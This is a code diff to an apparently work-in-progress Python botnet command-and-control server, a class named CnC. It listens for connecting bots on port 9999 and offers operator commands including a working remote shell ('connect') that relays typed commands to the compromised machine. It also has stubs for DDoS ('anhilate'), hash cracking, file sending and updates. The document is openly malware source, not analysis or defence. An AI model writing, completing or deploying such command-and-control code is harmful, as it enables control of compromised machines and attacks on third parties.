@@ -13,7 +13,9 @@ class CnC:
         self.target = "0.0.0.0"
         self.port = 9999
         self.Ccomand = ''
+        self.Active = []
         self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        #This is not the fix for freeing up socket
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     
     def server_loop(self):
@@ -28,7 +30,6 @@ class CnC:
             client_socket, addr = self.socket.accept()
             client_thread = threading.Thread(target=self.handler,args=(client_socket,addr))
             client_thread.start()
-            self.Ccommand = input("<*> ")
     
     def handler(self,client_socket,addr):
         response = client_socket.recv(4096)
@@ -38,26 +39,31 @@ class CnC:
             print(s)
             f.write(s)
         client_socket.send(b"ACK")
-        #List active connections etc.
-        if self.Ccommand == 'list':
-            self.list()
-        elif self.Ccommand == 'activate':
-            self.activate()
-        #For commandline execution
-        elif self.Ccommand == 'connect':
-            self.connect(client_socket)
-        #For sending some sort of file
-        elif self.Ccommand == 'send':
-            self.send()
-        #For DDoS
-        elif self.Ccommand == 'anhilate':
-            self.anhilate()
-        elif self.Ccommand == 'hashcracker':
-            self.hashcracker()
-        #In working
-        elif self.Ccommand == 'update':
-            self.update()
-        client_socket.close()
+        while True:
+            self.Ccommand = input("<*> ")
+            #List active connections etc.
+            if self.Ccommand == 'list':
+                print("Broo youre a genius")
+                self.list()
+            elif self.Ccommand == 'activate':
+                self.activate()
+            #For commandline execution
+            elif self.Ccommand == 'connect':
+                self.connect(client_socket)
+            #For sending some sort of file
+            elif self.Ccommand == 'send':
+                self.send()
+            #For DDoS
+            elif self.Ccommand == 'anhilate':
+                self.anhilate()
+            elif self.Ccommand == 'hashcracker':
+                self.hashcracker()
+            #In working
+            elif self.Ccommand == 'update':
+                self.update()
+            elif self.Ccommand == 'disengage':
+                self.disengage()
+        #client_socket.close()
 
     
     def list(self):
@@ -68,12 +74,16 @@ class CnC:
 
     def connect(self,client_socket):
         print('<*> Initialising shell at system')
-        time.sleep(2)
+        time.sleep(1)
         print('<*> Shell initialised!')
-        while command != 'terminate':
-            command = input('<*> ')
+        command = ''
+        while command != 'termminate':
+            '''client_socket.send(bytes("pwd",'utf-8'))
+            dir = client_socket.recv(4096).decode()
+            command = input(dir+'> ')'''
+            command = input("<*SHELL*> ")
             client_socket.send(bytes(command,'utf-8'))
-            print(client_socket.recv(4096))
+            print(client_socket.recv(4096).decode())
     
     def send(self):
         pass
@@ -87,6 +97,9 @@ class CnC:
     def update(self):
         pass
 
+    def disengage(self):
+        pass
+
 def main():
     print('''
 <*> Welcome to the Co-ordinate
@@ -94,7 +107,7 @@ def main():
 <*> To begin type help to see the available commands''')
     server = CnC()
     while True:
-        server.Ccommand = input("<*> ")
+        #server.Ccommand = input("<*> ")
         server.server_loop()
 
 if __name__ == '__main__':
